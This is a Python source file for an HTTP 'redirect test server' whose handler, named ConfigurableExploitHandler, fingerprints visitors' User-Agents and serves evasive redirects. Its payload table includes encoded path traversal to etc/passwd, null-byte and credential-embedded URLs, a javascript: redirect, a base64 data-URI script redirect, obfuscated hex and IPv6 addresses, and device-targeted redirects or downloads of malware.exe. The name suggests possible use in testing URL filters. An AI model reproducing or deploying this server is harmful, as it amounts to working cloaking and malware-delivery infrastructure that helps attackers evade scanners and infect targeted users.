import http.server
import socketserver
import base64
import urllib.parse
import json
import logging
import re
from http import HTTPStatus
from email.message import Message # Used for parsing headers easily

# --- Server Configuration ---
HOST = '0.0.0.0'  # Bind to specific IP
PORT = 5002         # Port to listen on
SERVER_NAME = "RedirectTestServer 2 (Optional)"
EXTERNAL_HOSTNAME = "spy.vatrion.com" # Hostname to use in Location headers

# --- Logging Configuration ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] %(message)s')

# --- Helper Function: User Agent Classification ---
def classify_user_agent(user_agent):
    """Refined UA classification helper."""
    if not user_agent: return {'browser': 'Unknown', 'os': 'Unknown', 'type': 'Unknown'}
    ua_lower = user_agent.lower()
    os_type = "Unknown"
    browser = "Unknown"
    ua_type = "Unknown"

    # OS checks (more specific)
    if 'windows nt' in ua_lower or 'windows phone' in ua_lower:
        os_type = 'Windows'
    elif 'android' in ua_lower:
        os_type = 'Android'
    elif 'iphone' in ua_lower or 'ipad' in ua_lower:
        os_type = 'iOS'
    elif 'macintosh' in ua_lower or 'mac os x' in ua_lower: # Matches Intel and Apple Silicon Macs
        os_type = 'macOS'
    elif 'linux' in ua_lower or 'x11' in ua_lower: # Catch Linux and X11 (often Linux/Unix)
        # Avoid classifying Android as Linux here
        if 'android' not in ua_lower:
            os_type = 'Linux'
    # Add other OS if needed (e.g., 'cros' for ChromeOS)

    # Browser checks (Order matters for engines like WebKit)
    # Check for specific browsers first
    if 'edg/' in ua_lower or 'edge/' in ua_lower: # Edge (Chromium based has edg/)
        browser = 'Edge'
    elif 'fxios/' in ua_lower: # Firefox on iOS
        browser = 'Firefox' # Still Firefox, OS is iOS
    elif 'crios/' in ua_lower: # Chrome on iOS
        browser = 'Chrome' # Still Chrome, OS is iOS
    elif 'opr/' in ua_lower or 'opera' in ua_lower: # Opera
        browser = 'Opera'
    elif 'firefox/' in ua_lower: # Firefox (non-iOS)
        browser = 'Firefox'
    elif 'chrome/' in ua_lower and 'chromium/' not in ua_lower: # Chrome (non-iOS, non-Edge)
        browser = 'Chrome'
    elif 'chromium/' in ua_lower: # Chromium
        browser = 'Chromium'
    elif 'safari/' in ua_lower and 'chrome/' not in ua_lower and 'chromium/' not in ua_lower and 'crios/' not in ua_lower and 'fxios/' not in ua_lower:
        # Safari (ensure it's not Chrome, Chromium, Edge, Firefox on iOS, or Chrome on iOS)
        browser = 'Safari'
    elif 'msie' in ua_lower or 'trident' in ua_lower: # Internet Explorer
        browser = 'IE'
    # Check for libraries/bots last
    elif 'curl/' in ua_lower:
        browser = 'curl'
        ua_type = 'Library'
    elif 'python-requests/' in ua_lower or 'python' in ua_lower:
        browser = 'Python'
        ua_type = 'Library'
    elif 'googlebot' in ua_lower:
        browser = 'Googlebot'
        ua_type = 'Bot'
    elif 'bingbot' in ua_lower:
        browser = 'Bingbot'
        ua_type = 'Bot'
    elif 'bot' in ua_lower or 'spider' in ua_lower or '+http' in ua_lower: # Generic bot catch
        browser = 'Bot'
        ua_type = 'Bot'

    if ua_type == "Unknown" and browser != "Unknown":
        ua_type = "Browser"

    return {'browser': browser, 'os': os_type, 'type': ua_type}

# --- Payload Configuration ---
PAYLOAD_CONFIG = {
    '/': {
        'technique': 'Index page for redirect server 2',
        'default_response': {'status': HTTPStatus.OK, 'headers': {'Content-Type': 'text/html'}, 'body': b'<html><body><h1>Redirect Server 2</h1><p>Handles second level redirects and complex evasion techniques.</p></body></html>'}
    },
    
    # --- Complex Redirect/Evasion Points ---
    '/complex1': {
        'technique': 'Complex redirect with multiple encoding levels',
        'default_response': {
            'redirect_to': 'http://spy.vatrion.com:5000/payload3?param=%252e%252e%252fsecret.txt%00&amp;amp;'
        }
    },
    '/complex2': {
        'technique': 'UA-based redirect with protocol and encoding tricks',
        'ua_rules': [
            {
                'match': {'os': 'Android', 'browser': 'Chrome'},
                'response': {
                    'redirect_to': 'http://user:pass@spy.vatrion.com:5000/payload4?file=image.jpg%00.txt'
                }
            },
            {
                'match': {'os': 'iOS', 'browser': 'Safari'},
                'response': {
                    'redirect_to': 'javascript:location.href="http://spy.vatrion.com:5000/payload3"'
                }
            }
        ],
        'default_response': {
            'redirect_to': 'ftp://192.168.2.70:5000/malicious.jsp'
        }
    },
    '/complex3': {
        'technique': 'Multi-trick combination - credentials, encoding, and suspicious tld',
        'default_response': {
            'redirect_to': 'http://admin:admin@spy.vatrion.com:5000/payload1?redir=http://malicious.zip/file.exe'
        }
    },
    '/complex4': {
        'technique': 'Punycode domain with path traversal and null byte',
        'default_response': {
            'redirect_to': 'http://xn--spy-vatrion-com:5000/payload2?file=../../etc/passwd%00'
        }
    },
    '/complex5': {
        'technique': 'Hex IP with cyrillic characters and double encoding',
        'default_response': {
            'redirect_to': 'http://0xC0A80245:5000/%D0%90%252e%252e%252fmalware.php'
        }
    },
    '/complex6': {
        'technique': 'Data protocol with base64 encoded redirect',
        'default_response': {
            'redirect_to': 'data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb249Imh0dHA6Ly9zcHkuZXZpbGVsaWFzLmNvbTo1MDAwL3BheWxvYWQzIjs8L3NjcmlwdD4='
        }
    },
    '/complex7': {
        'technique': 'IPv6 obfuscation with unicode separator',
        'default_response': {
            'redirect_to': 'http://[::C0A8:245]:5000/payload4?name=malware%u2028.exe'
        }
    },
    '/complex8': {
        'technique': 'Multiple redirect chain with mixed IPs',
        'default_response': {
            'redirect_to': 'http://3232236137:5000/payload1'
        }
    },
    '/complex9': {
        'technique': 'Redirect with embedded HTML and suspicious links',
        'html_body': '<html><body>Next: <a href="http://spy.vatrion.com:5000/payload3?redir=ftp://malicious.zip/malware.exe">payload3</a></body></html>',
        'default_response': {
            'headers': {'Content-Type': 'text/html'},
            'status': 200
        }
    },
    '/complex10': {
        'technique': 'Redirect to HTML with cyrillic and encoded param',
        'default_response': {
            'redirect_to': 'http://spy.vatrion.com:5000/payload4'
        }
    }
}

ENDPOINT_CONFIG = {
    '/endpoint1': {
        'file_mode': False,  # Set to True to serve a file (see 'file_path')
        'file_path': 'index.html',  # Path to file to serve if file_mode is True
        'ua_overrides': [
            {
                'os': 'Windows',
                'browser': 'Chrome',
                'version': '117.0',  # Optional, can omit for any version
                'response': {
                    'redirect_to': 'http://192.168.2.69:5000/malware.exe'
                }
            },
            # Add more UA-specific rules here
        ],
        'default_response': {
            'body': b'<html><body>Generic page for all other UAs</body></html>',
            'headers': {'Content-Type': 'text/html'},
            'status': HTTPStatus.OK
        }
    },
    '/endpoint2': {
        'file_mode': True,
        'file_path': 'malware.exe',
        'ua_overrides': [
            {
                'os': 'Android',
                'browser': 'Chrome',
                'response': {
                    'body': b'Android-specific payload',
                    'headers': {'Content-Type': 'application/octet-stream'},
                    'status': HTTPStatus.OK
                }
            }
        ],
        'default_response': {
            'body': b'File download for all other UAs',
            'headers': {'Content-Type': 'application/octet-stream'},
            'status': HTTPStatus.OK
        }
    },
    '/endpoint3': {
        'file_mode': False,
        'ua_overrides': [
            {
                'os': 'iOS',
                'browser': 'Safari',
                'response': {
                    'redirect_to': 'https://spy.vatrion.com:5000/index.html'
                }
            }
        ],
        'default_response': {
            'body': b'<html><body>Default content for endpoint3</body></html>',
            'headers': {'Content-Type': 'text/html'},
            'status': HTTPStatus.OK
        }
    },
    '/endpoint4': {
        'file_mode': False,
        'ua_overrides': [],
        'default_response': {
            'body': b'<html><body>Endpoint4: No UA override, just default</body></html>',
            'headers': {'Content-Type': 'text/html'},
            'status': HTTPStatus.OK
        }
    }
}

class ConfigurableExploitHandler(http.server.BaseHTTPRequestHandler):
    """
    Custom HTTP request handler to serve predefined payloads and simulate exploits
    based on path, User-Agent, and configuration.
    """
    server_version = SERVER_NAME
    sys_version = "" # Suppress Python version in Server header

    def get_response_for_request(self):
        """Determines the correct response based on path, UA, and PAYLOAD_CONFIG."""
        parsed_url = urllib.parse.urlparse(self.path)
        path = parsed_url.path
        query_params = urllib.parse.parse_qs(parsed_url.query)

        config = PAYLOAD_CONFIG.get(path)
        if not config:
            return {'status': HTTPStatus.NOT_FOUND, 'headers': {'Content-Type': 'text/plain'}, 'body': b'Resource not found.'}

        user_agent_string = self.headers.get('User-Agent')
        ua_info = classify_user_agent(user_agent_string)
        logging.info(f"Request for {path} from UA: {user_agent_string} -> Classified as: {ua_info}")

        # Check UA rules first
        if 'ua_rules' in config:
            for rule in config['ua_rules']:
                match_criteria = rule.get('match', {})
                matched = True
                for key, expected_value in match_criteria.items():
                    if ua_info.get(key) != expected_value:
                        matched = False
                        break
                if matched:
                    logging.info(f"UA rule matched for {path}: {match_criteria}")
                    return rule.get('response', config['default_response']) # Fallback to default if response missing

        # If no UA rule matched, return default
        return config['default_response']

    def handle_special_logic(self, response_config, query_params):
        """Handle special cases not covered by simple config responses."""
        parsed_url = urllib.parse.urlparse(self.path)
        path = parsed_url.path

        # Example: Base64 check for a specific path
        if path == '/base64_payload_required':
            required_param = 'data'
            encoded_value = query_params.get(required_param, [None])[0]
            if not encoded_value:
                 logging.warning(f"'{path}': Missing required param '{required_param}'")
                 return {'status': HTTPStatus.BAD_REQUEST, 'headers': {'Content-Type': 'text/plain'}, 'body': b'Missing required Base64 parameter "data".'}

            try:
                decoded_bytes = base64.b64decode(encoded_value)
                decoded_string = decoded_bytes.decode('utf-8')
                logging.info(f"'{path}': Decoded '{required_param}': {decoded_string}")
                # You could add checks for the decoded value here
                return {'status': HTTPStatus.OK, 'headers': {'Content-Type': 'text/plain'}, 'body': f'Received and decoded Base64: {decoded_string}'.encode()}
            except Exception as e:
                logging.warning(f"'{path}': Failed to decode Base64 param '{required_param}': {e}")
                return {'status': HTTPStatus.BAD_REQUEST, 'headers': {'Content-Type': 'text/plain'}, 'body': b'Invalid Base64 encoding for parameter "data".'}

        # Add more special logic handlers here if needed

        # If no special logic handled, return original config
        return response_config


    def send_configured_response(self, response_config):
        """Sends the HTTP response based on the determined configuration."""
        status_code = response_config.get('status', HTTPStatus.FOUND) # Default to 302 for redirects
        headers = response_config.get('headers', {}).copy() # Copy to avoid modifying config
        body = response_config.get('body')
        redirect_target = response_config.get('redirect_to')

        if redirect_target:
            # Use the redirect_to value directly as-is
            headers['Location'] = redirect_target
            body = body or b'Redirecting...' # Default redirect body

        # Ensure Content-Type if body exists and type not set
        if body is not None and 'Content-Type' not in headers:
            headers['Content-Type'] = 'text/plain' # Default content type

        # Ensure Content-Length if body exists
        if body is not None:
             # Convert body to bytes if it's not already
             if isinstance(body, str):
                 body = body.encode('utf-8')
             headers['Content-Length'] = str(len(body))

        # Send response
        self.send_response(status_code)
        for key, value in headers.items():
            self.send_header(key, value)
        self.end_headers()

        if body is not None:
            self.wfile.write(body)

        logging.info(f"Served: {self.path} -> Status: {status_code} | Redirect: {redirect_target} | Body Len: {len(body) if body else 0}")


    def do_GET(self):
        parsed_url = urllib.parse.urlparse(self.path)
        path = parsed_url.path
        config = PAYLOAD_CONFIG.get(path)
        if not config:
            # Return 404 instead of calling super().do_GET()
            self.send_response(HTTPStatus.NOT_FOUND)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'404 Not Found: The requested path does not exist on this server.')
            logging.warning(f"404 Not Found: {path}")
            return

        user_agent = self.headers.get('User-Agent', '')
        ua_info = classify_user_agent(user_agent)
        
        # Check UA overrides
        for rule in config.get('ua_rules', []):
            match_criteria = rule.get('match', {})
            matched = True
            for key, expected_value in match_criteria.items():
                if ua_info.get(key) != expected_value:
                    matched = False
                    break
            
            if matched:
                resp = rule.get('response', {})
                if 'redirect_to' in resp:
                    # Handle redirect for UA match
                    self.send_response(HTTPStatus.FOUND)
                    self.send_header('Location', resp['redirect_to'])
                    self.end_headers()
                    logging.info(f"Redirecting UA match for {path} to {resp['redirect_to']}")
                    return
                else:
                    # Handle non-redirect response for UA match
                    self.send_response(resp.get('status', HTTPStatus.OK))
                    for k, v in resp.get('headers', {}).items():
                        self.send_header(k, v)
                    self.end_headers()
                    if 'body' in resp:
                        body = resp['body']
                        if isinstance(body, str):
                            body = body.encode('utf-8')
                        self.wfile.write(body)
                    return

        # Handle default response
        default_resp = config.get('default_response', {})
        if 'redirect_to' in default_resp:
            # Handle redirect in default response
            redirect_url = default_resp['redirect_to']
            self.send_response(HTTPStatus.FOUND)
            self.send_header('Location', redirect_url)
            self.end_headers()
            logging.info(f"Redirecting {path} to {redirect_url}")
            return
            
        # Handle file mode
        if config.get('file_mode'):
            try:
                with open(config['file_path'], 'rb') as f:
                    content = f.read()
                self.send_response(default_resp.get('status', HTTPStatus.OK))
                for k, v in default_resp.get('headers', {}).items():
                    self.send_header(k, v)
                self.end_headers()
                self.wfile.write(content)
            except Exception as e:
                self.send_error(HTTPStatus.NOT_FOUND, f'File not found: {e}')
            return

        # Handle HTML body mode
        if 'html_body' in config:
            html = config['html_body']
            if isinstance(html, str):
                html = html.encode('utf-8')
            self.send_response(HTTPStatus.OK)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(html)
            return

        # Handle regular response
        self.send_response(default_resp.get('status', HTTPStatus.OK))
        for k, v in default_resp.get('headers', {}).items():
            self.send_header(k, v)
        self.end_headers()
        if 'body' in default_resp:
            body = default_resp['body']
            if isinstance(body, str):
                body = body.encode('utf-8')
            self.wfile.write(body)


    # Add do_POST, do_PUT etc. if needed, following similar logic

def run_server(server_class=http.server.HTTPServer, handler_class=ConfigurableExploitHandler, host=HOST, port=PORT):
    """Starts the HTTP server."""
    server_address = (host, port)
    try:
        httpd = server_class(server_address, handler_class)
        logging.info(f"Starting configurable test server on http://{host}:{port}...")
        logging.info(f"External redirects will target: http://{EXTERNAL_HOSTNAME}:{port}")
        httpd.serve_forever()
    except OSError as e:
        logging.error(f"Could not start server on {host}:{port}. Error: {e}")
        logging.error("Is the port already in use?")
    except KeyboardInterrupt:
        logging.info("Server stopped by user.")
        httpd.server_close()

if __name__ == '__main__':
    run_server()
